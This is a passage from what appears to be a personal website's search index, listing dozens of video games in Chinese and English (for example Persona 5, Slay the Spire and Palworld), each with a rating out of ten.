Fate/Samurai Remnant [5/10] 极限竞速：地平线4 [5/10] 永远消失的幻想乡 [5/10] BLUE REFLECTION：帝 [5/10] 人格解体 [5/10] 苏菲的炼金工房2 [5/10] Xenoblade 2 [5/10] Persona 5 Tacica [5/10] Wolong [5/10] AI 梦境档案 [5/10] Granblue Fantasy Versus: Rising [5/10] Persona4 Golden [5/10] Slay the Spire [5/10] 莱莎的炼金工房2 [4/10] Riddle Joker [4/10] CODE VEIN [4/10] 超侦探事件簿：雾雨迷宫 [4/10] 真女神转生5复仇 [4/10] Palworld [4/10] 千恋万花 [4/10] 魔女的夜宴 [4/10] Since Memories: 星穹之下 [4/10] 星光咖啡馆与死神之蝶 [4/10] Fire Emblem：风花雪月 [4/10] Tales of Arise [4/10] Parquet [4/10] 主播女孩重度依赖 [4/10] Sea of stars [4/10] Dark Souls III [4/10] Phoenotopia Awakening [4/10] 宝可梦：紫 [4/10] 歧路旅人 [3/10] LOOPERS [3/10] 人类一败涂地 [3/10] 尼尔机械纪元 [3/10] Monster Hunter Stories 2: Wings of Ruin [3/10] FINAL FANTASY XVI [3/10] Crymachina [3/10] Shenmue III [3/10] 绝区零 [3/10] BLUE REFLECTION [2/10] 不可思议的幻想乡TOD RELOADED [2/10] ","date":"2020-02-10","objectID":"/ngn/:0:1","tags":null,"title":"NGN","uri":"/ngn/"}]